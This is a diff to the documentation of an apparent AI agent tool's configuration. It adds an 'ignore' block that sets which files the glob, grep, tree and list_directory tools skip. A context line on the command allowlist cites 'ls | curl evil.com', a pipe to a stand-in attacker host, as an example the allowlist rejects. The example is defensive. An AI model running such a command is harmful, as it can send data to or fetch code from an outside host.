@@ -145,6 +145,11 @@ All paths are resolved relative to `--work-dir`.
     "defaultDepth": 3,
     "ignore": ["node_modules", ".git", "dist", ".next", "__pycache__", ".venv", "venv"]
   },
+  "ignore": {
+    "useGitignore": true,
+    "useDefaultPatterns": true,
+    "customPatterns": []
+  },
   "command": {
     "defaultTimeout": 30000,
     "maxTimeout": 120000
@@ -190,6 +195,16 @@ The `exec` block governs `exec_command` and `write_stdin`:
 | `defaultShell` | `$SHELL`, else PowerShell on Windows and `/bin/sh` elsewhere | Shell used when an `exec_command` call names none |
 
 Under `"allowlist"`, the command string is tokenized and each command position — after every `|`, `&&`, `;`, newline, and subshell — is checked, so `ls | curl evil.com` is rejected on `curl`. Command substitution (`$(...)`, backticks) is rejected outright, since its contents cannot be checked before the shell runs them.
+
+The `ignore` block decides what the file-walking tools — `glob`, `grep`, `tree` and `list_directory` — never surface, so a search returns your code rather than the contents of `node_modules`. One policy covers all four:
+
+| Key | Default | Description |
+|-----|---------|-------------|
+| `useGitignore` | `true` | Read the work directory's `.gitignore` and `.git/info/exclude`, so a file the repo ignores stays out of results |
+| `useDefaultPatterns` | `true` | Skip a built-in set (`node_modules`, `.git`, `dist`, `build`, `out`, `.next`, `.nuxt`, `.svelte-kit`, `.turbo`, `coverage`, `__pycache__`, `.venv`, `venv`, `.cache`) |
+| `customPatterns` | `[]` | Extra gitignore-syntax patterns applied on top for every tool |
+
+Patterns use `.gitignore` syntax. Only the work directory's own `.gitignore` is read, not per-subdirectory ones. `node_modules` and `.git` are pruned from every walk no matter what, so a search never pays to descend them even with everything else turned off. The older `tree.ignore` list still works and now applies to all four tools too. `list_directory` pointed straight at an ignored directory still shows its contents, so you can look inside `node_modules` on purpose.
 
 The `projectDoc` block governs [AGENTS.md](#agentsmd) discovery. All three keys are optional, and the block itself can be left out entirely:
 
